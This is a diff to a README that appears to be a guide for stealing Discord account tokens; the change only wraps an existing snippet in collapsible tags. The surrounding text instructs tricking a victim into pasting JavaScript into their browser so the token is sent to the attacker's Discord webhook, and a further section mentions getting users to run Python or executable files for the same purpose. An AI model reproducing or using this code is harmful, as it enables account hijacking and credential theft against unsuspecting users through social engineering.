@@ -64,6 +64,10 @@ Alternative codes, follow the same steps as above.
 
 Get user to copy and paste this code into browser and token will be automatically sent back to you via discord webhook. Replace ```YOUR DISCORD WEBHOOK HERE``` with your discord webhook URL.
 
+<details>
+
+<summary>Code: </summary>    
+    
 ```
 location.reload();
 var discordWebhook = "YOUR DISCORD WEBHOOK HERE";
@@ -80,6 +84,8 @@ var params = {
 request.send(JSON.stringify(params));
 ```
 
+</details>    
+    
 ### Method 3: Get user to run code and token will be sent to you (Python/C++)
 
 Get user to run python code OR exe file and token will be automatically sent back to you via discord webhook. 
